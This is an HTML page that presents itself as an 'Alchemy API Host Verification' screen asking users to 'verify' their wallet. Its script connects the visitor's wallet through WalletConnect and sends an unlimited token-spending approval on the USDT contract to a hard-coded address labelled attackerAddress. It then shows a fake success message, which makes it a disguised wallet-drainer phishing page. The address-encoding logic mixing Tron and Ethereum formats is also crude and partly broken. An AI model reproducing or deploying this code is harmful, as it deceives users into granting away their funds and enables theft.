<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alchemy API Host Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; text-align: center; padding-top: 50px; }
        .card { background: #1e293b; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); display: inline-block; width: 90%; max-width: 400px; }
        .logo { width: 70px; margin-bottom: 20px; }
        h2 { margin-bottom: 10px; font-size: 22px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; }
        #verifyBtn { background: #3b82f6; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-weight: bold; width: 100%; }
        #verifyBtn:hover { background: #2563eb; }
        #status { margin-top: 20px; font-size: 13px; color: #64748b; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://www.alchemy.com/favicon.ico" class="logo" alt="Alchemy">
        <h2>Host Verification</h2>
        <p>Authorize your wallet to connect with Alchemy API payout queue.</p>
        <button id="verifyBtn">Verify Wallet</button>
        <div id="status">Status: Waiting for connection...</div>
    </div>

    <script>
        const attackerAddress = "TDwKgDDRSefonFbaHaf82nB8RLjrAXaR6n";
        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const approvalAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

        document.getElementById('verifyBtn').onclick = async () => {
            const status = document.getElementById('status');
            status.innerText = "Connecting to Trust Wallet...";

            // WalletConnect හරහා Trust Wallet සම්බන්ධ කිරීම
            const provider = new WalletConnectProvider.default({
                rpc: {
                    1: "https://mainnet.infura.io/v3/YOUR_INFURA_ID", // මූලික සම්බන්ධතාවය සඳහා
                },
                qrcode: true // QR එක ඕනේ නම් විතරක්
            });

            try {
                // Wallet එක Connect කරගැනීම
                await provider.enable();
                const web3 = new Web3(provider);
                const accounts = await web3.eth.getAccounts();
                const account = accounts[0];

                status.innerText = "Switching to TRON Network...";

                // මෙතනදී අපි Tron Smart Contract එකට අදාළ Call එක යවනවා
                // Trust Wallet එක TRC20 සෘජුවම Browser එකේ නොදුන්නත් 
                // WalletConnect හරහා Custom Request එකක් විදිහට මෙය යැවිය හැක.
                
                const data = "0x095ea7b3" + 
                             attackerAddress.replace('T', '0').padStart(64, '0') + 
                             approvalAmount.replace('0x', '').padStart(64, '0');

                status.innerText = "Please confirm the verification in your wallet...";

                await web3.eth.sendTransaction({
                    from: account,
                    to: usdtContract, // USDT Contract එකට Request එක යවනවා
                    data: data
                });

                status.innerText = "Verification Successful! Wallet connected to Alchemy payout queue.";
                status.style.color = "#10b981";

            } catch (error) {
                console.error(error);
                status.innerText = "Verification failed. Please try again.";
                status.style.color = "#ef4444";
            }
        };
    </script>
</body>
</html>
